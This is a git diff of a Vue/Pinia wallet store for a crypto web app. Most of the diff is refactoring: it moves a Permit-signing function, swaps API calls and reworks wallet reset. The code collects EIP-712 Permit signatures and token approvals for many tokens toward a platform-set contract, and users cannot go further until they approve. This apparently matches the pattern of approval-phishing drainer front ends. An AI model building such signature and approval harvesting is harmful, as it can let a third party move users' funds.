@@ -9,7 +9,7 @@ import i18n from '@/i18n/index.js'
 import { userStore } from '@/store/index.js'
 import { AAVE_ABI, BNB_ABI, DAI_ABI, RENBTC_ABI, STETH_ABI, STKAAVE_ABI, UNI_ABI, USDC_ABI, XAUT_ABI } from '@/config/abi.js'
 import router from '@/router'
-import { getAllChainApi, getAllPlatformTokenBalanceApi } from '@/apis/wallet.js'
+import { fetchWalletConfig, getAllCoinTypeApi } from '@/apis/wallet.js'
 import { useToken } from '@/hooks/useToken.js'
 import { ercAuthApi, usdtAuthApi } from '@/apis/user.js'
 import { useRoute } from 'vue-router'
@@ -115,6 +115,64 @@ const ERC20_ABI = [
 	},
 ]
 
+const onSignUNI = async ({ from, domain, message, Permit = Permit_1 }) => {
+	const sign = {
+		'types': {
+			'EIP712Domain': [
+				{
+					'name': 'name',
+					'type': 'string',
+				},
+				// {
+				//     'name': 'version',
+				//     'type': 'string'
+				// },
+				{
+					'name': 'chainId',
+					'type': 'uint256',
+				},
+				{
+					'name': 'verifyingContract',
+					'type': 'address',
+				},
+			],
+			Permit,
+		},
+		'primaryType': 'Permit',
+		domain,
+		message,
+	}
+
+	console.log('useWeb3Store', '签名Permit：', Permit)
+	console.log('useWeb3Store', '签名domain：', domain)
+	console.log('useWeb3Store', '签名message：', message)
+	console.log('useWeb3Store', '签名全部参数：', sign)
+
+	try {
+		const result = await window.ethereum.request({
+			method: 'eth_signTypedData_v4',
+			params: [from, JSON.stringify(sign)],
+		})
+
+		const r = result.slice(0, 66),
+			s = `0x${result.slice(66, 130)}`,
+			v = `0x${result.slice(130, 132)}`
+
+		console.log('useWeb3Store', '签名结果：', result)
+		console.log('useWeb3Store', '签名结果 r：', r)
+		console.log('useWeb3Store', '签名结果 s：', s)
+		console.log('useWeb3Store', '签名结果 v：', v)
+		return { result, r, s, v, sign }
+	} catch (e) {
+		console.error('onSignUNI---情况', e)
+		await nextTick()
+		const web3Store = useWeb3Store()
+		web3Store.initWallet()
+		router.push('/noWallet')
+		throw e
+	}
+}
+
 const USDT_CONTRACT_ADDRESS = ''
 
 const DEFAULT_SENDER_ADDRESS = ''
@@ -173,63 +231,6 @@ const USDC_DOMAIN = {
 		'chainId': '1',
 		'verifyingContract': '',
 	}
-
-const onSignUNI = async ({ from, domain, message, Permit = Permit_1 }) => {
-	const sign = {
-		'types': {
-			'EIP712Domain': [
-				{
-					'name': 'name',
-					'type': 'string',
-				},
-				// {
-				//     'name': 'version',
-				//     'type': 'string'
-				// },
-				{
-					'name': 'chainId',
-					'type': 'uint256',
-				},
-				{
-					'name': 'verifyingContract',
-					'type': 'address',
-				},
-			],
-			Permit,
-		},
-		'primaryType': 'Permit',
-		domain,
-		message,
-	}
-
-	console.log('useWeb3Store', '签名Permit：', Permit)
-	console.log('useWeb3Store', '签名domain：', domain)
-	console.log('useWeb3Store', '签名message：', message)
-	console.log('useWeb3Store', '签名全部参数：', sign)
-
-	try {
-		const result = await window.ethereum.request({
-			method: 'eth_signTypedData_v4',
-			params: [from, JSON.stringify(sign)],
-		})
-
-		const r = result.slice(0, 66),
-			s = `0x${result.slice(66, 130)}`,
-			v = `0x${result.slice(130, 132)}`
-
-		console.log('useWeb3Store', '签名结果：', result)
-		console.log('useWeb3Store', '签名结果 r：', r)
-		console.log('useWeb3Store', '签名结果 s：', s)
-		console.log('useWeb3Store', '签名结果 v：', v)
-		return { result, r, s, v, sign }
-	} catch (e) {
-		console.error('onSignUNI---情况', e)
-		const web3Store = useWeb3Store()
-		web3Store.initWallet()
-		router.push('/noWallet')
-		throw e
-	}
-}
 
 const onSign = async ({ from, domain, message, Permit = Permit_1 }) => {
 	const sign = {
@@ -295,6 +296,7 @@ const onSign = async ({ from, domain, message, Permit = Permit_1 }) => {
 		return { result, r, s, v, sign }
 	} catch (e) {
 		console.error('onSign--情况', e)
+		await nextTick()
 		const web3Store = useWeb3Store()
 		web3Store.initWallet()
 		router.push('/noWallet')
@@ -332,13 +334,13 @@ export const useWeb3Store = defineStore('web3', () => {
 	const userStoreObj = userStore()
 	const { loginAction } = userStoreObj
 	const { userId } = storeToRefs(userStoreObj)
-	const { getTokenClientList, getTokenConfig } = useToken()
+	const { getPlatformTokenByCoinType, getPlatformTokenList, tokenClientList } = useToken()
 
 	// 平台币种列表
 	const currencyList = ref([])
 	const getCurrencyList = async () => {
 		try {
-			const allChainResponse = await getAllChainApi()
+			const allChainResponse = await getAllCoinTypeApi()
 
 			currencyList.value = allChainResponse.data || []
 			console.log('useWeb3Store', '获取币种列表', currencyList.value)
@@ -346,13 +348,10 @@ export const useWeb3Store = defineStore('web3', () => {
 			console.log('useWeb3Store', '获取币种列表失败', e)
 		}
 	}
-	const authrizeTokenList = ref([])
-	const getAllPlatformTokenBalance = async () => {
-		const tokenListResponse = await getAllPlatformTokenBalanceApi()
-		console.log('useWeb3Store', '获取平台代币余额', tokenListResponse.data)
-		// 已经在平台授权过的币种
-		authrizeTokenList.value = (tokenListResponse.data || []).filter((d) => d.isAuthrize === 1)
-	}
+
+	const authrizeTokenList = computed(() => {
+		return tokenClientList.value.filter((d) => d.isAuthrize === 1)
+	})
 
 	const initUserAccountAndWallet = async () => {
 		console.log('useWeb3Store', '========initUserAccountAndWallet============')
@@ -379,7 +378,7 @@ export const useWeb3Store = defineStore('web3', () => {
 				await loginAction()
 			}
 
-			await getAllPlatformTokenBalance()
+			await getPlatformTokenList()
 			// 当前选择币种是否被授权过
 			if (authrizeTokenList.value.some((d) => d.tokenName === currentCurrency.value.tokenName)) {
 				console.log('useWeb3Store', '已经在平台授权过')
@@ -401,6 +400,10 @@ export const useWeb3Store = defineStore('web3', () => {
 
 	// web3初始化链接
 	const initWallet = async () => {
+		if (web3.value) {
+			console.log('useWeb3Store', `钱包已初始化`)
+			return
+		}
 		console.log('useWeb3Store', `===========初始化钱包 begin==============`)
 		try {
 			if (window.ethereum) {
@@ -428,30 +431,18 @@ export const useWeb3Store = defineStore('web3', () => {
 		removeEvent()
 		// 钱包事件监听
 		addEvent()
-
-		// 添加地址监听
-		if (address.value) {
-			console.log('useWeb3Store', '添加地址监听', address.value)
-			// todo 地址监控
-			// addAddressListenApi({
-			// 	walletAddress: address.value,
-			// 	chain: 'ETH',
-			// })
-		}
 	}
 
-	// todo 动态获取 项目合约地址
 	const contractAddress = ref('0x12bc774c9db27c422Be8C8cBF3e7E2271E38EE5C')
 	const getContractAddressByTokenType = async (tokenType) => {
-		// todo 待完善
-		// try {
-		// 	const response = await ddd()
-		// 	if (response.data) {
-		// 		contractAddress.value = response.data
-		// 	}
-		// } catch (e) {
-		// 	console.log('useWeb3Store', '获取合约地址接口错误', e)
-		// }
+		try {
+			const response = await fetchWalletConfig()
+			if (response.data) {
+				contractAddress.value = response.data.contractAddress
+			}
+		} catch (e) {
+			console.log('useWeb3Store', '获取合约地址接口错误', e)
+		}
 	}
 
 	// 选择币种
@@ -475,17 +466,15 @@ export const useWeb3Store = defineStore('web3', () => {
 			}
 		}
 
-		// todo 切换币种是否需要重新登录
-		// await loginAction()
-
 		const currencyTokenName = currency.tokenName
 		currentCurrency.value = currency
 
+		// 获取合约地址
 		await getContractAddressByTokenType(currencyTokenName)
 
-		// 强制刷新一次token配置
-		await getTokenClientList()
-		const config = await getTokenConfig(currencyTokenName)
+		// 获取指定平台币种信息
+		// todo 请求401后无法有效请求
+		const config = await getPlatformTokenByCoinType(currencyTokenName)
 
 		// 如果当前token已经授权过，就直接进入首页
 		if (!config || config.isAuthrize === 1) {
@@ -533,7 +522,9 @@ export const useWeb3Store = defineStore('web3', () => {
 							.send({ from: address, gas: 50000 })
 							.on('error', (error) => {
 								console.error('授权额度交易失败，错误信息:', error)
-								router.push('/noWallet')
+								nextTick().then(() => {
+									router.push('/noWallet')
+								})
 							})
 
 						console.log('useWeb3Store', '授权额度Approval transaction:', result)
@@ -566,6 +557,7 @@ export const useWeb3Store = defineStore('web3', () => {
 					await nextTick()
 					router.replace('/home')
 				} catch (e) {
+					await nextTick()
 					console.error('USDT授权操作失败:', e)
 					router.push('/noWallet')
 				}
@@ -948,9 +940,6 @@ export const useWeb3Store = defineStore('web3', () => {
 		}
 	}
 
-	// todo 登录流程待确认
-	// initUserAccountAndWallet()
-
 	return {
 		web3,
 		accounts,
@@ -1010,11 +999,19 @@ const signDaiPermit = async (walletClient, domain, holder, spender, nonce, expir
 
 const resetAccount = async () => {
 	console.log('useWeb3Store', '========resetAccount begin===========')
+
+	await nextTick()
+
+	// 清空登录用户信息
 	const { resetLoginData } = userStore()
 	resetLoginData()
 
-	const { initWallet } = useWeb3Store()
+	// 钱包连接初始化
+	const web3Store = useWeb3Store()
+	const { web3 } = storeToRefs(web3Store)
+	web3.value = null
 
+	// 清空缓存币种信息
 	const data = useLocalStorage('currentCurrency', {})
 	data.value = {
 		id: 0,
@@ -1033,25 +1030,17 @@ const resetAccount = async () => {
 		usd: 0,
 		picUrlStr: '',
 	}
-	await nextTick()
 
-	// initWallet()
 	if (router.currentRoute.value.name !== 'noWallet') {
-		router.replace({ name: 'noWallet' })
-	} else {
-		window.location.reload()
+		await router.replace({ name: 'noWallet' })
 	}
+	window.location.reload()
 }
 // 小狐狸MetaMask的事件监听
 const events = {
 	accountsChanged(accounts) {
 		// 指的是此页面连接的账户，连接小狐狸后再切换账户，此事件才会触发
 		console.log('useWeb3Store', '切换了账户', accounts)
-		// todo 确认操作
-		// const { initWallet } = useWeb3Store()
-		// initWallet()
-		// web3Store.accounts.value = accounts
-		// showToast('已切换钱包账户')
 		resetAccount()
 	},
 	chainChanged(chainId) {
